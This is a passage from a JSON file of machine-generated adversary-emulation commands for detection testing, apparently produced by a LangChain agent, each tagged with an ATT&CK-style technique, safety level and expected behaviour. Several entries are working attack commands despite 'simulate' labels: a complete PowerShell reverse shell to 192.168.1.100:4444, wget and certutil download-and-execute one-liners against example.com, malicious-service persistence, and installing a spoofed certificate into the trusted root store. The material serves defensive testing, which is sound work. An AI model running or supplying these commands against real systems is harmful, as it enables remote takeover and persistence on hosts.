      "description": "Download a payload from a remote server to the local temp directory using certutil, simulating retrieval of an exploit payload after initial access.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Attempts to download a file from the specified URL to the user's temp directory. Will fail silently if the server is unreachable. No execution occurs.",
      "source": "langchain",
      "generated_at": "2025-12-28T13:58:42.368586",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.702,
      "validated": true
    },
    {
      "id": "0fbc3c08-dc82-4308-b3e5-4cc3d86174b9",
      "ttp_id": "e771f0b9-345e-418b-a2df-810b4325dda3",
      "technique_id": "e771f0b9-345e-418b-a2df-810b4325dda3",
      "technique_name": "Exploit Public-Facing Application",
      "tactic": "Initial Access",
      "platform": "windows",
      "command": "cmd.exe /c echo \"Benign test file\" > %TEMP%\\svchost.log && sc.exe create \"UpdateService\" binPath=\"%TEMP%\\svchost.log\" start= auto",
      "description": "Simulate creation of a malicious service using a fake binary path, using legacy binaries to register a persistent service pointing to a benign test file.",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "Creates a text file in temp and attempts to register a Windows service pointing to it. The service will fail to start due to invalid binary, but registration attempt is logged.",
      "source": "langchain",
      "generated_at": "2025-12-28T13:58:42.369748",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.702,
      "validated": true
    },
    {
      "id": "0f1956b2-e377-4b50-9de2-03f9c0714f5c",
      "ttp_id": "e771f0b9-345e-418b-a2df-810b4325dda3",
      "technique_id": "e771f0b9-345e-418b-a2df-810b4325dda3",
      "technique_name": "Exploit Public-Facing Application",
      "tactic": "Initial Access",
      "platform": "windows",
      "command": "powershell -Command \"try { $client = New-Object System.Net.Sockets.TCPClient('192.168.1.100',4444); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) { $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush() }; $client.Close() } catch { }\"",
      "description": "Simulate a reverse shell connection back to an attacker-controlled server, using PowerShell for network communication and command execution.",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "Attempts to establish a TCP connection to 192.168.1.100:4444. If the listener is active, allows remote command execution. Runs in memory and exits silently on failure.",
      "source": "langchain",
      "generated_at": "2025-12-28T13:58:42.369748",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.702,
      "validated": true
    },
    {
      "id": "340cd750-87ee-489c-8875-a7472441a373",
      "ttp_id": "e771f0b9-345e-418b-a2df-810b4325dda3",
      "technique_id": "e771f0b9-345e-418b-a2df-810b4325dda3",
      "technique_name": "Exploit Public-Facing Application",
      "tactic": "Initial Access",
      "platform": "linux",
      "command": "curl -X GET 'http://example.com/vulnerable_app?exploit=true'",
      "description": "Simulate an exploit attempt against a public-facing web application using curl.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "The command should trigger a detection rule for potential exploitation attempts against public-facing applications without causing harm.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:06:56.436294",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.702,
      "validated": true
    },
    {
      "id": "b5448d81-5368-4d16-bd1a-db5ffb1021eb",
      "ttp_id": "e771f0b9-345e-418b-a2df-810b4325dda3",
      "technique_id": "e771f0b9-345e-418b-a2df-810b4325dda3",
      "technique_name": "Exploit Public-Facing Application",
      "tactic": "Initial Access",
      "platform": "linux",
      "command": "wget http://example.com/malicious_payload -O /tmp/payload && bash /tmp/payload",
      "description": "Simulate downloading and executing a malicious payload from a public-facing application.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "This command should be detected as a potential exploit of a public-facing application. Note: In a real test scenario, ensure '/tmp/payload' is not an actual malicious file.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:06:56.436294",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.702,
      "validated": true
    },
    {
      "id": "0c665fcd-f137-42e7-bdcc-c4fc77051d6e",
      "ttp_id": "e771f0b9-345e-418b-a2df-810b4325dda3",
      "technique_id": "e771f0b9-345e-418b-a2df-810b4325dda3",
      "technique_name": "Exploit Public-Facing Application",
      "tactic": "Initial Access",
      "platform": "linux",
      "command": "bash -c 'echo \"Exploit Attempt\" > /tmp/exploit_test'",
      "description": "Use bash to create a file that indicates an exploit attempt, simulating post-exploitation activities.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "The command should create a file in /tmp/ indicating an exploit attempt, which can be used to test detection capabilities.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:06:56.436294",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.702,
      "validated": true
    },
    {
      "id": "951e60e1-7255-4f14-b851-7a4beee5b425",
      "ttp_id": "6d9a5ca6-c40c-4899-ac53-4f17281924e8",
      "technique_id": "6d9a5ca6-c40c-4899-ac53-4f17281924e8",
      "technique_name": "Active Scanning",
      "tactic": "Reconnaissance",
      "platform": "windows",
      "command": "for /L %i in (1,1,254) do @ping -n 1 -w 100 192.168.1.%i | findstr \"Reply\"",
      "description": "Perform a basic ICMP ping sweep of the local 192.168.1.0/24 network to identify active hosts using built-in ping and findstr.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Loops through IP addresses 192.168.1.1 to 192.168.1.254, sends one ping with 100ms timeout, and prints only replies. Minimal network impact and no system modifications.",
      "source": "langchain",
      "generated_at": "2025-12-28T13:50:37.910701",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.694,
      "validated": true
    },
    {
      "id": "dcf6568a-1dcd-4ecb-89b7-cc6886236b73",
      "ttp_id": "6d9a5ca6-c40c-4899-ac53-4f17281924e8",
      "technique_id": "6d9a5ca6-c40c-4899-ac53-4f17281924e8",
      "technique_name": "Active Scanning",
      "tactic": "Reconnaissance",
      "platform": "windows",
      "command": "powershell -Command \"1..100 | ForEach-Object { $addr = '192.168.1.' + $_; $socket = New-Object Net.Sockets.TcpClient; $connect = $socket.BeginConnect($addr, 445, $null, $null); Start-Sleep -Milli 150; if ($socket.Connected) { Write-Output \"Port 445 open on $addr\" }; $socket.Close() }\"",
      "description": "Intermediate TCP port scanning of port 445 (SMB) across 100 hosts in the 192.168.1.0/24 subnet using PowerShell TcpClient.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Attempts TCP connection to port 445 on each IP from 192.168.1.1 to 192.168.1.100 with 150ms delay between probes. Outputs only successful connections. Uses built-in .NET class via standard PowerShell object creation (allowed). No payloads sent.",
      "source": "langchain",
      "generated_at": "2025-12-28T13:50:37.910701",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.694,
      "validated": true
    },
    {
      "id": "a3e71735-5cb3-44d1-a121-e9479b8ee6b6",
      "ttp_id": "6d9a5ca6-c40c-4899-ac53-4f17281924e8",
      "technique_id": "6d9a5ca6-c40c-4899-ac53-4f17281924e8",
      "technique_name": "Active Scanning",
      "tactic": "Reconnaissance",
      "platform": "windows",
      "command": "cmd.exe /c \"echo Scanning started at %TIME% > \"%TEMP%\\scanlog.txt\" && for /L %i in (20,1,25) do @nslookup 192.168.1.%i 192.168.1.1 >> \"%TEMP%\\scanlog.txt\" 2>&1\" && echo Scan complete >> \"%TEMP%\\scanlog.txt\"",
      "description": "Advanced scanning using nslookup to query DNS records for a range of IPs via a specified DNS server, logging results to a temporary file.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates a log file in %TEMP% with timestamp, performs nslookup for IPs 192.168.1.20 to 192.168.1.25 using DNS server 192.168.1.1, appends output (including errors) to the log, and adds completion message. File operations use %TEMP% and no force overwrite is needed.",
      "source": "langchain",
      "generated_at": "2025-12-28T13:50:37.910701",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.694,
      "validated": true
    },
    {
      "id": "0ee2f03d-b275-47ab-88e5-098fbbe1b0ef",
      "ttp_id": "6d9a5ca6-c40c-4899-ac53-4f17281924e8",
      "technique_id": "6d9a5ca6-c40c-4899-ac53-4f17281924e8",
      "technique_name": "Active Scanning",
      "tactic": "Reconnaissance",
      "platform": "linux",
      "command": "ping -c 4 127.0.0.1",
      "description": "Basic ICMP echo request to localhost to check host reachability",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Sends 4 ICMP packets to localhost and displays round-trip time statistics if successful",
      "source": "langchain",
      "generated_at": "2025-12-28T13:58:42.626703",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.694,
      "validated": true
    },
    {
      "id": "7b85cbb9-2f0a-4a43-9a25-02198a6744f4",
      "ttp_id": "6d9a5ca6-c40c-4899-ac53-4f17281924e8",
      "technique_id": "6d9a5ca6-c40c-4899-ac53-4f17281924e8",
      "technique_name": "Active Scanning",
      "tactic": "Reconnaissance",
      "platform": "linux",
      "command": "nmap -sT -p 22,80,443 192.168.1.1",
      "description": "Intermediate TCP connect scan against common ports on a local gateway IP",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Performs full TCP handshake on ports 22, 80, and 443 of 192.168.1.1 and reports open/closed status",
      "source": "langchain",
      "generated_at": "2025-12-28T13:58:42.626703",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.694,
      "validated": true
    },
    {
      "id": "53c00eea-e7ed-4c13-b2de-5b9c3cc602ed",
      "ttp_id": "6d9a5ca6-c40c-4899-ac53-4f17281924e8",
      "technique_id": "6d9a5ca6-c40c-4899-ac53-4f17281924e8",
      "technique_name": "Active Scanning",
      "tactic": "Reconnaissance",
      "platform": "linux",
      "command": "nmap -sS -O -p 1-1000 -oN $HOME/scan_results.txt 127.0.0.1",
      "description": "Advanced SYN scan with OS detection on first 1000 ports, saving output to user's home directory",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "Sends SYN packets to ports 1-1000 on localhost, attempts OS fingerprinting, and writes results to a file in the user's home directory",
      "source": "langchain",
      "generated_at": "2025-12-28T13:58:42.626703",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.694,
      "validated": true
    },
    {
      "id": "0b481f42-3def-4fc4-b5db-42922c4fb8c1",
      "ttp_id": "c3e70b60-ca2e-4a9c-943f-a632113cf614",
      "technique_id": "c3e70b60-ca2e-4a9c-943f-a632113cf614",
      "technique_name": "User Execution",
      "tactic": "Execution",
      "platform": "windows",
      "command": "certutil.exe -urlcache -split -f http://example.com/test.scr %TEMP%\\update.bat && cmd.exe /c %TEMP%\\update.bat",
      "description": "Download and execute a batch file using certutil and cmd, simulating user-driven execution of a downloaded file.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Downloads a file from a URL to the temp directory and executes it using cmd. The file 'update.bat' is run in the current user context.",
      "source": "langchain",
      "generated_at": "2025-12-28T13:54:37.766817",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.689,
      "validated": true
    },
    {
      "id": "2d107b6b-1c02-4637-814a-28f38d94cee9",
      "ttp_id": "c3e70b60-ca2e-4a9c-943f-a632113cf614",
      "technique_id": "c3e70b60-ca2e-4a9c-943f-a632113cf614",
      "technique_name": "User Execution",
      "tactic": "Execution",
      "platform": "windows",
      "command": "powershell -Command \"Start-Process notepad.exe -ArgumentList '%TEMP%\\malicious.lnk' -Verb Open\"",
      "description": "Simulate execution of a malicious link file via PowerShell using Start-Process with Open verb, mimicking user double-click behavior.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Attempts to open a .lnk file in the temp directory using the default handler, simulating user interaction with a shortcut file.",
      "source": "langchain",
      "generated_at": "2025-12-28T13:54:37.766817",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.689,
      "validated": true
    },
    {
      "id": "757bb357-527c-4c6d-b677-baaf9a14a8ee",
      "ttp_id": "c3e70b60-ca2e-4a9c-943f-a632113cf614",
      "technique_id": "c3e70b60-ca2e-4a9c-943f-a632113cf614",
      "technique_name": "User Execution",
      "tactic": "Execution",
      "platform": "windows",
      "command": "cmd.exe /c echo @echo This is a test payload > %TEMP%\\payload.bat && cmd.exe /c %TEMP%\\payload.bat",
      "description": "Create and execute a benign batch script in the temp directory, simulating user execution of a local script.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Writes a simple echo command to a batch file and then executes it, demonstrating local script execution by the user.",
      "source": "langchain",
      "generated_at": "2025-12-28T13:54:37.766817",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.689,
      "validated": true
    },
    {
      "id": "3fb1d0b2-e582-4d2d-970c-e169d0638248",
      "ttp_id": "c3e70b60-ca2e-4a9c-943f-a632113cf614",
      "technique_id": "c3e70b60-ca2e-4a9c-943f-a632113cf614",
      "technique_name": "User Execution",
      "tactic": "Execution",
      "platform": "linux",
      "command": "bash /tmp/test_script.sh",
      "description": "Basic execution of a script in the /tmp directory",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "The script /tmp/test_script.sh will be executed by the bash shell.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:03:18.141272",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.689,
      "validated": true
    },
    {
      "id": "f411ac8a-1cae-4a4b-b8f9-e45b2729b03f",
      "ttp_id": "c3e70b60-ca2e-4a9c-943f-a632113cf614",
      "technique_id": "c3e70b60-ca2e-4a9c-943f-a632113cf614",
      "technique_name": "User Execution",
      "tactic": "Execution",
      "platform": "linux",
      "command": "./test_program",
      "description": "Intermediate execution of a program in the current directory",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "The program ./test_program will be executed if it has execute permissions.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:03:18.141272",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.689,
      "validated": true
    },
    {
      "id": "8dcf514e-7b02-45ec-abef-6754c4124e02",
      "ttp_id": "c3e70b60-ca2e-4a9c-943f-a632113cf614",
      "technique_id": "c3e70b60-ca2e-4a9c-943f-a632113cf614",
      "technique_name": "User Execution",
      "tactic": "Execution",
      "platform": "linux",
      "command": "sudo /path/to/advanced_script.sh",
      "description": "Advanced execution of a script with elevated privileges",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "The script /path/to/advanced_script.sh will be executed with elevated privileges if the user has sudo access.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:03:18.141777",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.689,
      "validated": true
    },
    {
      "id": "c5816437-6d29-4921-a7aa-6b690e2bc060",
      "ttp_id": "d9b59ad8-3de5-47ba-8a44-7b8169765046",
      "technique_id": "d9b59ad8-3de5-47ba-8a44-7b8169765046",
      "technique_name": "Valid Accounts",
      "tactic": "Initial Access",
      "platform": "windows",
      "command": "net use \\\\localhost\\C$ /user:Administrator \"testPassword123\" && whoami",
      "description": "Authenticate to local administrative share using valid credentials via net.exe",
      "requires_admin": true,
      "safety_level": "low",
      "expected_behavior": "Prompts for credentials if invalid; if valid, maps the C$ share and executes whoami to confirm context. Connection remains until manually removed or session ends.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:03:17.942179",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.683,
      "validated": true
    },
    {
      "id": "2e912c3e-3b1d-421e-836f-9b1ad20de86e",
      "ttp_id": "d9b59ad8-3de5-47ba-8a44-7b8169765046",
      "technique_id": "d9b59ad8-3de5-47ba-8a44-7b8169765046",
      "technique_name": "Valid Accounts",
      "tactic": "Initial Access",
      "platform": "windows",
      "command": "runas /user:DOMAIN\\testuser \"cmd.exe /c ipconfig > %TEMP%\\network.txt\"",
      "description": "Execute command as another user using runas with valid domain account",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Prompts for password. If valid, runs ipconfig and saves output to a temporary file. No persistent changes are made.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:03:17.942179",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.683,
      "validated": true
    },
    {
      "id": "a3c476cd-5bc2-4a50-af13-05a6adf9c4fd",
      "ttp_id": "d9b59ad8-3de5-47ba-8a44-7b8169765046",
      "technique_id": "d9b59ad8-3de5-47ba-8a44-7b8169765046",
      "technique_name": "Valid Accounts",
      "tactic": "Initial Access",
      "platform": "windows",
      "command": "powershell -Command \"mkdir '$env:TEMP\\\\_temp_access' -ErrorAction SilentlyContinue; $cred = Get-Credential -Message 'Authentication Required'; $session = New-PSSession -Credential $cred -ComputerName localhost; Invoke-Command -Session $session -ScriptBlock { Get-Process } | Out-Null; Remove-PSSession $session -ErrorAction SilentlyContinue\"",
      "description": "Establish PowerShell remoting session using valid credentials",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Prompts user for credentials. If valid, creates a PS session, lists processes remotely, then cleans up the session. Uses built-in remoting with no payload execution.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:03:17.942179",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.683,
      "validated": true
    },
    {
      "id": "82225905-9895-4ce8-aa4e-47abdf375f89",
      "ttp_id": "d9b59ad8-3de5-47ba-8a44-7b8169765046",
      "technique_id": "d9b59ad8-3de5-47ba-8a44-7b8169765046",
      "technique_name": "Valid Accounts",
      "tactic": "Initial Access",
      "platform": "linux",
      "command": "ssh user@localhost",
      "description": "Basic attempt to login using a valid account",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Successful login if credentials are correct",
      "source": "langchain",
      "generated_at": "2025-12-28T14:07:54.738246",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.683,
      "validated": true
    },
    {
      "id": "37a32911-da75-4036-b7eb-ce749181ecee",
      "ttp_id": "d9b59ad8-3de5-47ba-8a44-7b8169765046",
      "technique_id": "d9b59ad8-3de5-47ba-8a44-7b8169765046",
      "technique_name": "Valid Accounts",
      "tactic": "Initial Access",
      "platform": "linux",
      "command": "sudo -u user bash -c 'whoami'",
      "description": "Intermediate command to switch to a valid user account and verify",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "Switches to the specified user and prints the username",
      "source": "langchain",
      "generated_at": "2025-12-28T14:07:54.738246",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.683,
      "validated": true
    },
    {
      "id": "41e4b2a0-ad3b-4679-96c1-d7eaf150d5e4",
      "ttp_id": "d9b59ad8-3de5-47ba-8a44-7b8169765046",
      "technique_id": "d9b59ad8-3de5-47ba-8a44-7b8169765046",
      "technique_name": "Valid Accounts",
      "tactic": "Initial Access",
      "platform": "linux",
      "command": "su - user -c 'id'",
      "description": "Advanced command to switch user and execute a command to verify account details",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "Switches to the specified user and prints user and group information",
      "source": "langchain",
      "generated_at": "2025-12-28T14:07:54.738246",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.683,
      "validated": true
    },
    {
      "id": "cac4ae17-3ce9-4421-b1df-d87066f447cc",
      "ttp_id": "1559bd31-d607-464d-b57d-6b6fed071b8e",
      "technique_id": "1559bd31-d607-464d-b57d-6b6fed071b8e",
      "technique_name": "Use Alternate Authentication Material",
      "tactic": "Credential Access",
      "platform": "windows",
      "command": "runas /user:Administrator \"cmd.exe /c echo Test > %TEMP%\\runas_test.txt\"",
      "description": "Simulates use of alternate credentials by invoking runas to execute a command as a different user (e.g., Administrator). This leverages alternate authentication material if valid credentials are provided.",
      "requires_admin": true,
      "safety_level": "low",
      "expected_behavior": "Prompts for password of the target user. If credentials are valid, creates a test file in %TEMP%. If run in an environment without the specified user, fails gracefully. No persistent changes made.",
      "source": "langchain",
      "generated_at": "2025-12-28T13:54:37.766817",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.681,
      "validated": true
    },
    {
      "id": "5a44cc66-2477-4cb5-9770-9a7406f5ff3c",
      "ttp_id": "1559bd31-d607-464d-b57d-6b6fed071b8e",
      "technique_id": "1559bd31-d607-464d-b57d-6b6fed071b8e",
      "technique_name": "Use Alternate Authentication Material",
      "tactic": "Credential Access",
      "platform": "windows",
      "command": "certutil.exe -generateSSTFromCRL https://invalid-url-for-test/cert.crl $env:TEMP\\test.sst 2>&1",
      "description": "Abuses certutil.exe, a built-in Windows binary, to simulate fetching or processing certificate-related data from a remote (non-existent) source. Adversaries may use certutil to retrieve or manipulate certificates used as alternate authentication material.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Attempts to generate an SST file from a CRL at a non-existent URL. Fails with a network error but demonstrates use of certutil for certificate manipulation. No file is created. Safe for testing as no real payload is retrieved.",
      "source": "langchain",
      "generated_at": "2025-12-28T13:54:37.766817",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.681,
      "validated": true
    },
    {
      "id": "cc89f021-50a3-4697-aaed-2919ac4385d9",
      "ttp_id": "1559bd31-d607-464d-b57d-6b6fed071b8e",
      "technique_id": "1559bd31-d607-464d-b57d-6b6fed071b8e",
      "technique_name": "Use Alternate Authentication Material",
      "tactic": "Credential Access",
      "platform": "windows",
      "command": "powershell -Command \"mkdir '$env:TEMP\\ShadowPad_Test' -ErrorAction SilentlyContinue; $content = ' benign marker only '; Set-Content -Path '$env:TEMP\\ShadowPad_Test\\token.dat' -Value $content -Force; Start-Process cmd.exe -ArgumentList '/c echo Simulating token access && dir $env:TEMP\\ShadowPad_Test' -Verb RunAs\"",
      "description": "Simulates creation of a token or credential cache file and attempts to access it with elevated privileges, mimicking how backdoors like ShadowPad might store and reuse alternate authentication material.",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "Creates a test directory and file in %TEMP%, then spawns a new elevated command prompt (if consent is granted) to simulate access to stored authentication material. The file contains only a benign string. Directory is removed manually after test. Uses only built-in cmdlets and avoids .NET reflection.",
      "source": "langchain",
      "generated_at": "2025-12-28T13:54:37.766817",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.681,
      "validated": true
    },
    {
      "id": "c0e7ffe3-07a0-42a5-b3e3-6116aeeceaf7",
      "ttp_id": "1559bd31-d607-464d-b57d-6b6fed071b8e",
      "technique_id": "1559bd31-d607-464d-b57d-6b6fed071b8e",
      "technique_name": "Use Alternate Authentication Material",
      "tactic": "Credential Access",
      "platform": "linux",
      "command": "sudo -u testuser ls /home/testuser",
      "description": "Attempt to list files as a different user using 'sudo' with the '-u' option to specify the username.",
      "requires_admin": true,
      "safety_level": "low",
      "expected_behavior": "The command should list the files in the home directory of the specified user if the authentication is successful.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:03:18.140265",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.681,
      "validated": true
    },
    {
      "id": "a604bd16-6305-4b50-975e-303ee1d06c2e",
      "ttp_id": "1559bd31-d607-464d-b57d-6b6fed071b8e",
      "technique_id": "1559bd31-d607-464d-b57d-6b6fed071b8e",
      "technique_name": "Use Alternate Authentication Material",
      "tactic": "Credential Access",
      "platform": "linux",
      "command": "ssh testuser@localhost 'ls /home/testuser'",
      "description": "Use SSH to connect as a different user and list files in their home directory.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "The command should list the files in the home directory of the specified user if the SSH connection and authentication are successful.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:03:18.140265",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.681,
      "validated": true
    },
    {
      "id": "7ed4e83b-8b46-429c-a3bc-ba6433635344",
      "ttp_id": "1559bd31-d607-464d-b57d-6b6fed071b8e",
      "technique_id": "1559bd31-d607-464d-b57d-6b6fed071b8e",
      "technique_name": "Use Alternate Authentication Material",
      "tactic": "Credential Access",
      "platform": "linux",
      "command": "su - testuser -c 'ls /home/testuser'",
      "description": "Use the 'su' command to switch to a different user and list files in their home directory.",
      "requires_admin": true,
      "safety_level": "low",
      "expected_behavior": "The command should list the files in the home directory of the specified user if the authentication is successful.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:03:18.140265",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.681,
      "validated": true
    },
    {
      "id": "7eb815ed-7602-4d3a-9ec6-a63a2d2b3ed1",
      "ttp_id": "4f4b98b5-a0a2-44d2-b486-7de6abbc6f71",
      "technique_id": "4f4b98b5-a0a2-44d2-b486-7de6abbc6f71",
      "technique_name": "Obfuscated Files or Information",
      "tactic": "Defense Evasion",
      "platform": "windows",
      "command": "certutil.exe -decode \"C:\\\\Windows\\\\System32\\\\license.rtf\" \"$env:TEMP\\\\decoded_payload.bin\" >nul 2>&1",
      "description": "Decodes a base64-encoded file using certutil, simulating extraction of obfuscated content from a benign system file.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Attempts to decode a non-existent file silently; no system changes occur. Safe for testing in isolated environments.",
      "source": "langchain",
      "generated_at": "2025-12-28T13:58:42.509640",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.68,
      "validated": true
    },
    {
      "id": "79340074-2671-42aa-a713-a15e8f33d71c",
      "ttp_id": "4f4b98b5-a0a2-44d2-b486-7de6abbc6f71",
      "technique_id": "4f4b98b5-a0a2-44d2-b486-7de6abbc6f71",
      "technique_name": "Obfuscated Files or Information",
      "tactic": "Defense Evasion",
      "platform": "windows",
      "command": "echo 'UEsDBBQAAAAIAJZlwlYAAAAAIAAAAA==\\n' > \"$env:TEMP\\\\encoded.txt\" & certutil.exe -decode \"$env:TEMP\\\\encoded.txt\" \"$env:TEMP\\\\decoded.bin\" -f",
      "description": "Creates a mock base64-encoded file and decodes it using certutil, simulating retrieval of obfuscated data.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates a temporary encoded file and decodes it into a binary file in %TEMP%. No harmful payload is used.",
      "source": "langchain",
      "generated_at": "2025-12-28T13:58:42.509640",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.68,
      "validated": true
    },
    {
      "id": "0b8041e4-ae3e-4227-9478-93b58c2a9ede",
      "ttp_id": "4f4b98b5-a0a2-44d2-b486-7de6abbc6f71",
      "technique_id": "4f4b98b5-a0a2-44d2-b486-7de6abbc6f71",
      "technique_name": "Obfuscated Files or Information",
      "tactic": "Defense Evasion",
      "platform": "windows",
      "command": "powershell -Command \"try { $certPath = '$env:TEMP\\\\mock_ms.cer'; Set-Content -Path $certPath -Value 'MOCK SPOOFED MICROSOFT CERTIFICATE DATA' -Force; Start-Process certutil -ArgumentList '-addstore', '-f', 'Root', $certPath -Verb RunAs } catch { exit 1 }\"",
      "description": "Simulates installation of a spoofed Microsoft certificate by placing a mock certificate file and attempting to add it to the trusted root store.",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "Creates a mock certificate file and attempts to install it in the root certificate store. Requires elevation. Fails safely without admin rights.",
      "source": "langchain",
      "generated_at": "2025-12-28T13:58:42.509640",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.68,
      "validated": true
    },
    {
      "id": "1c8e7728-d958-41ec-a79e-3b6d602286db",
      "ttp_id": "4f4b98b5-a0a2-44d2-b486-7de6abbc6f71",
      "technique_id": "4f4b98b5-a0a2-44d2-b486-7de6abbc6f71",
      "technique_name": "Obfuscated Files or Information",
      "tactic": "Defense Evasion",
      "platform": "linux",
      "command": "openssl req -x509 -newkey rsa:2048 -nodes -keyout key.pem -out cert.pem -days 365 -subj \"/C=US/ST=State/L=Locality/O=Organization/CN=www.example.com\"",
      "description": "Generate a self-signed SSL certificate using OpenSSL",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "A self-signed SSL certificate is generated and saved to cert.pem and key.pem files",
      "source": "langchain",
      "generated_at": "2025-12-28T14:06:56.435444",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.68,
      "validated": true
    },
    {
      "id": "0534883c-2699-4560-a05b-5e1ead54f225",
      "ttp_id": "4f4b98b5-a0a2-44d2-b486-7de6abbc6f71",
      "technique_id": "4f4b98b5-a0a2-44d2-b486-7de6abbc6f71",
      "technique_name": "Obfuscated Files or Information",
      "tactic": "Defense Evasion",
      "platform": "linux",
      "command": "openssl base64 -in file.txt -out encoded_file.txt",
      "description": "Obfuscate a file using base64 encoding",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "The file contents are encoded using base64 and saved to a new file",
      "source": "langchain",
      "generated_at": "2025-12-28T14:06:56.435954",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.68,
      "validated": true
    },
    {
      "id": "e7d916e9-2dab-46ca-a152-4d1bbbeef7d1",
      "ttp_id": "4f4b98b5-a0a2-44d2-b486-7de6abbc6f71",
      "technique_id": "4f4b98b5-a0a2-44d2-b486-7de6abbc6f71",
      "technique_name": "Obfuscated Files or Information",
